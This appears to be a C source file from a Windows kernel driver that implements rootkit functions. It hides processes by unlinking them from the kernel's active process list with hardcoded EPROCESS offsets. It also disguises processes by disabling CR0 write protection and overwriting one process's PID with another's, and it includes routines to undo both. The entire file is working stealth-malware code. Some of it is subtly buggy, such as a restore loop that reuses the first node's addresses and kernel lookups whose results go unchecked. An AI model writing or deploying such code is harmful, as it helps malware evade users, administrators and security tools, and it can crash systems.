#include "ProcessHideAndPretentHeader.h"

PHPL createHiddenProcessNode(
    IN ULONG64 pidOfHiddenProcess,
    IN PEPROCESS eprocessHeaderOfHiddenProcess,
    IN PLIST_ENTRY prevEntryAddress,
    IN PLIST_ENTRY nextEntryAddress
)
{
    PHPL newNode = (PHPL)ExAllocatePoolWithTag(PagedPool, sizeof(HPL), 'ssss');
    if (newNode)
    {
        newNode->pidAlreadyHidden = pidOfHiddenProcess;
        newNode->eprocessHeaderAddressOfHiddenProcess = eprocessHeaderOfHiddenProcess;
        newNode->prevProcessEntry = prevEntryAddress;
        newNode->nextProcessEntry = nextEntryAddress;
        newNode->HiddenProcessEntry.Flink = NULL;
        newNode->HiddenProcessEntry.Blink = NULL;
    }
    return newNode;
}
PPPL createPretentProcessNode(
    IN ULONG64 dirtyPID,
    IN ULONG64 parasitePID
)
{
    PPPL newNode = (PPPL)ExAllocatePoolWithTag(PagedPool, sizeof(PPL), 'rrrr');
    if (newNode)
    {
        newNode->dirtyPID = dirtyPID;
        newNode->parasitePID = parasitePID;
        newNode->PretentProcessEntry.Flink = NULL;
        newNode->PretentProcessEntry.Blink = NULL;
    }
    return newNode;
}
VOID printListHPL(
    IN PHPL headHPL
)
{
    PHPL temp = headHPL;
    while (temp->HiddenProcessEntry.Flink != &headHPL->HiddenProcessEntry)
    {
        DbgPrint("Hidden processes pid: %llx, eprocess header address: 0x%p, prevEntryAddress: 0x%p, nextEntryAddress: 0x%p", (ULONG64)temp->pidAlreadyHidden, (PVOID)temp->eprocessHeaderAddressOfHiddenProcess, (PVOID)temp->prevProcessEntry, (PVOID)temp->nextProcessEntry);
        temp = CONTAINING_RECORD(temp->HiddenProcessEntry.Flink, HPL, HiddenProcessEntry);
    }
    DbgPrint("Hidden processes pid: %llx, eprocess header address: 0x%p, prevEntryAddress: 0x%p, nextEntryAddress: 0x%p", (ULONG64)temp->pidAlreadyHidden, (PVOID)temp->eprocessHeaderAddressOfHiddenProcess, (PVOID)temp->prevProcessEntry, (PVOID)temp->nextProcessEntry);
}
VOID printListPPL(
    IN PPPL headPPL
)
{
    PPPL temp = headPPL;
    while (temp->PretentProcessEntry.Flink != &headPPL->PretentProcessEntry)
    {
        DbgPrint("Pretent process pid: %llu, parasite process pid: %llu", temp->dirtyPID, temp->parasitePID);
        temp = CONTAINING_RECORD(temp->PretentProcessEntry.Flink, PPL, PretentProcessEntry);
    }
    DbgPrint("Pretent process pid: %llu, parasite process pid: %llu", temp->dirtyPID, temp->parasitePID);
}
VOID processHiddenProcedure(
    IN ULONG64 pid,
    IN PHPL* headHPL
)
{
    PEPROCESS pe = IoGetCurrentProcess();
    ULONG64 UniqueProcessIdOffset = 0x440;
    ULONG64 ActiveProcessLinksOffset = 0x448;
    PLIST_ENTRY thisPeNode = NULL;
    while (*(ULONG64*)((ULONG64)pe + UniqueProcessIdOffset) != pid)
    {
        thisPeNode = (PLIST_ENTRY)((ULONG64)pe + ActiveProcessLinksOffset);
        pe = (PEPROCESS)((UL64)thisPeNode->Flink - ActiveProcessLinksOffset);
    }
    //DbgPrint("***%p***", *(HANDLE*)((ULONG64)pe + UniqueProcessIdOffset));
    //这个pe就是目标pid的进程，接下来是断链隐藏
    PLIST_ENTRY currPeListEntryAddress = (PLIST_ENTRY)((UL64)pe + ActiveProcessLinksOffset);
    PLIST_ENTRY prevPeListEntryAddress = currPeListEntryAddress->Blink;
    PLIST_ENTRY nextPeListEntryAddress = currPeListEntryAddress->Flink;
    prevPeListEntryAddress->Flink = nextPeListEntryAddress;
    nextPeListEntryAddress->Blink = prevPeListEntryAddress;
    if (*headHPL == NULL)
    {
        PHPL newNode = createHiddenProcessNode((ULONG64)pid, pe, prevPeListEntryAddress, nextPeListEntryAddress);
        (*headHPL) = newNode;
        (*headHPL)->HiddenProcessEntry.Flink = &((*headHPL)->HiddenProcessEntry);
        (*headHPL)->HiddenProcessEntry.Blink = (*headHPL)->HiddenProcessEntry.Flink;
    }
    else
    {
        PHPL temp = *headHPL;
        while (temp->HiddenProcessEntry.Flink != &((*headHPL)->HiddenProcessEntry))
        {
            temp = CONTAINING_RECORD(temp->HiddenProcessEntry.Flink, HPL, HiddenProcessEntry);
        }
        PHPL newNode = createHiddenProcessNode((ULONG64)pid, pe, prevPeListEntryAddress, nextPeListEntryAddress);
        if (newNode)
        {
            temp->HiddenProcessEntry.Flink = &newNode->HiddenProcessEntry;
            newNode->HiddenProcessEntry.Flink = &((*headHPL)->HiddenProcessEntry);
            newNode->HiddenProcessEntry.Blink = &temp->HiddenProcessEntry;
            (*headHPL)->HiddenProcessEntry.Blink = &newNode->HiddenProcessEntry;
        }
    }
    DbgPrint("进程0x%p(%llu)已经断链隐藏.", (PVOID)pid, pid);
    return;
}
VOID restoreHiddenProcess(
    IN PHPL headHPL
)
{
    PHPL temp = headHPL;
    ULONG64 activeProcessLinksAddress = 0x448;
    PLIST_ENTRY thisNodePrevNodeEntryAddress = temp->prevProcessEntry;
    PLIST_ENTRY thisNodeEntryAddress = (PLIST_ENTRY)((ULONG64)temp->eprocessHeaderAddressOfHiddenProcess + activeProcessLinksAddress);
    PLIST_ENTRY thisNodeNextNodeEntryAddress = temp->nextProcessEntry;
    while (temp->HiddenProcessEntry.Flink != &headHPL->HiddenProcessEntry)
    {
        temp->prevProcessEntry->Flink = thisNodeEntryAddress;
        thisNodeEntryAddress->Flink = thisNodeNextNodeEntryAddress;
        thisNodeNextNodeEntryAddress->Blink = thisNodeEntryAddress;
        thisNodeEntryAddress->Blink = thisNodePrevNodeEntryAddress;
        temp = CONTAINING_RECORD(temp->HiddenProcessEntry.Flink, HPL, HiddenProcessEntry);
    }
    temp->prevProcessEntry->Flink = thisNodeEntryAddress;
    thisNodeEntryAddress->Flink = thisNodeNextNodeEntryAddress;
    thisNodeNextNodeEntryAddress->Blink = thisNodeEntryAddress;
    thisNodeEntryAddress->Blink = thisNodePrevNodeEntryAddress;
    return;
}
VOID processPretentProcedure(
    IN HANDLE dirtyPID,
    IN HANDLE parasitePID,
    OUT PPPL* headPPL
)
{
    ULONG64 uniqueProcessIDOffset = 0x440;
    PEPROCESS dirtyPE = NULL;
    PsLookupProcessByProcessId((HANDLE)dirtyPID, &dirtyPE);
    ULONG64 dirtyPIDAddress = (ULONG64)dirtyPE + uniqueProcessIDOffset;
    ULONG64 tempParasitePid = (ULONG64)parasitePID;
    ULONG64 oldCR0 = 0x0;
    __asm__WRbreak(&oldCR0);
    memcpy((PVOID)dirtyPIDAddress, (PVOID)&tempParasitePid, sizeof(HANDLE));
    __asm__WRrestore(oldCR0);
    if (*headPPL == NULL)
    {
        *headPPL = createPretentProcessNode(
            (ULONG64)dirtyPID,
            (ULONG64)parasitePID
        );
        (*headPPL)->PretentProcessEntry.Flink = &((*headPPL)->PretentProcessEntry);
        (*headPPL)->PretentProcessEntry.Blink = (*headPPL)->PretentProcessEntry.Flink;
    }
    else
    {
        PPPL temp = *headPPL;
        while (temp->PretentProcessEntry.Flink != &((*headPPL)->PretentProcessEntry))
        {
            temp = CONTAINING_RECORD(temp->PretentProcessEntry.Flink, PPL, PretentProcessEntry);
        }
        PPPL newNode = createPretentProcessNode(
            (ULONG64)dirtyPID,
            (ULONG64)parasitePID
        );
        if (newNode)
        {
            temp->PretentProcessEntry.Flink = &newNode->PretentProcessEntry;
            newNode->PretentProcessEntry.Flink = &((*headPPL)->PretentProcessEntry);
            newNode->PretentProcessEntry.Blink = &temp->PretentProcessEntry;
            (*headPPL)->PretentProcessEntry.Blink = &newNode->PretentProcessEntry;
        }
    }
    return;
}
VOID restorePretentProcess(
    IN PPPL headPPL
)
{
    PPPL temp = headPPL;
    while (temp->PretentProcessEntry.Flink != &headPPL->PretentProcessEntry)
    {
        PEPROCESS dirtyPE = NULL;
        PsLookupProcessByProcessId((HANDLE)temp->dirtyPID, &dirtyPE);
        ULONG64 tempDirtyPid = temp->dirtyPID;
        ULONG64 oldCR0 = 0x0;
        __asm__WRbreak(&oldCR0);
        //KeBugCheckEx(0x22222222, 0, 0, 0, 0);
        memcpy((PVOID)((ULONG64)dirtyPE + 0x440), (PVOID)&tempDirtyPid, sizeof(HANDLE));
        //KeBugCheckEx(0x33333333, 0, 0, 0, 0);
        __asm__WRrestore(oldCR0);
        ObDereferenceObject(dirtyPE);
        temp = CONTAINING_RECORD(temp->PretentProcessEntry.Flink, PPL, PretentProcessEntry);
    }
    PEPROCESS dirtyPE = NULL;
    PsLookupProcessByProcessId((HANDLE)temp->dirtyPID, &dirtyPE);
    ULONG64 tempDirtyPid = temp->dirtyPID;
    ULONG64 oldCR0 = 0x0;
    __asm__WRbreak(&oldCR0);
    //KeBugCheckEx(0x22222222, 0, 0, 0, 0);
    memcpy((PVOID)((ULONG64)dirtyPE + 0x440), (PVOID)&tempDirtyPid, sizeof(HANDLE));
    //KeBugCheckEx(0x33333333, 0, 0, 0, 0);
    __asm__WRrestore(oldCR0);
    ObDereferenceObject(dirtyPE);
}
VOID ExFreeHiddenProcessLink(
    OUT PHPL* headHPL
)
{
    PHPL tempHPL = *headHPL;
    while (tempHPL != NULL && tempHPL->HiddenProcessEntry.Flink != NULL)
    {
        PHPL tempX = CONTAINING_RECORD(tempHPL->HiddenProcessEntry.Flink, HPL, HiddenProcessEntry);
        tempHPL->HiddenProcessEntry.Flink = NULL;
        tempHPL->HiddenProcessEntry.Blink = NULL;
        ExFreePool(tempHPL);
        tempHPL = tempX;
    }
}
VOID ExFreePretentProcessLink(
    OUT PPPL* headPPL
)
{
    PPPL tempPPL = *headPPL;
    while (tempPPL != NULL && tempPPL->PretentProcessEntry.Flink != NULL)
    {
        PPPL tempX = CONTAINING_RECORD(tempPPL->PretentProcessEntry.Flink, PPL, PretentProcessEntry);
        tempPPL->PretentProcessEntry.Flink = NULL;
        tempPPL->PretentProcessEntry.Blink = NULL;
        ExFreePool(tempPPL);
        tempPPL = tempX;
    }
}
